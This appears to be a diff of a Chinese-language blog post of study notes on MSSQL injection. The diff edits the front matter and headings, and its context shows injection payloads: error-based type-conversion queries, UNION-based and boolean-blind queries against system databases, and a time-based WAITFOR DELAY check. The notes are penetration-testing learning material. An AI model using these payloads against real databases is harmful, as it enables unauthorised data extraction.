@@ -1,18 +1,16 @@
 ---
 title: "MSSQL 注入学习笔记"
 date: 2019-05-17T12:46:13+08:00
-lastmod: 2019-05-17T12:46:13+08:00
 draft: true
 tags: ['mssql','sql']
 categories: ['渗透测试']
-comment: true
 ---
 
 跟着404师傅学[mssql注入](https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI)写的笔记
 
 <!--more-->
 
-# 自带库介绍
+## 自带库介绍
 
 ```
 master   //用于记录所有SQL Server系统级别的信息，这些信息用于控制用户数据库和数据操作。
@@ -36,7 +34,7 @@ mssql的存储过程天然支持多语句，为我们的注入提供了遍历。
 
 增删改查和MySQL数据库大同小异，具体可以自行w3c。
 
-# 信息搜集
+## 信息搜集
 
 先来了解下mssql中有哪些角色/权限
 
@@ -111,7 +109,7 @@ SELECT @@servername;	//主机名
 select * from user where id='1'and host_name()=@@servername;--'
 ```
 
-# 符号
+## 符号
 
 注释符
 
@@ -145,7 +143,7 @@ OR  如果两个布尔表达式中的任何一个为true，那么结果为true
 SOME    如果在一组比较中，有些比较为true，那么结果为true
 ```
 
-# 基本注入流程
+## 基本注入流程
 
 此处利用mssql数据类型不一样比较报错，爆出当前数据库名
 
@@ -249,7 +247,7 @@ SELECT * FROM Fanmv_Admin WHERE AdminID=1 GROUP BY AdminID,IsSystem having 1=1
 
 以此爆出所有字段
 
-# 报错注入
+## 报错注入
 
 其实基本注入流程中用到的就是报错注入，mssql中没有报错函数，报错注入利用的就是显式或隐式的类型转换来报错
 
@@ -276,7 +274,7 @@ select * from admin where id =1;declare @a varchar(2000) set @a='select convert(
 
 `declare`定义变量 `set`赋值`exec`执行
 
-# 联合查询注入
+## 联合查询注入
 
 mssql不用数字占位，因为可能会发生隐式转换，我们用null来占位
 
@@ -290,7 +288,7 @@ SELECT * from users where id=1 union select null,null,DB_NAME();
 SELECT * from users where id=1 union select null,null, (select CAST(db_name() as int))
 ```
 
-# 布尔盲注
+## 布尔盲注
 
 ```mssql
 SELECT * from users where id=1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1))=109
@@ -298,7 +296,7 @@ SELECT * from users where id=1 and ascii(substring((select top 1 name from maste
 
 布尔盲注没有mssql那么多姿势，大同小异截取字符串比较
 
-# 时间盲注
+## 时间盲注
 
 ```mssql
 SELECT * from users where id=1;if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5'
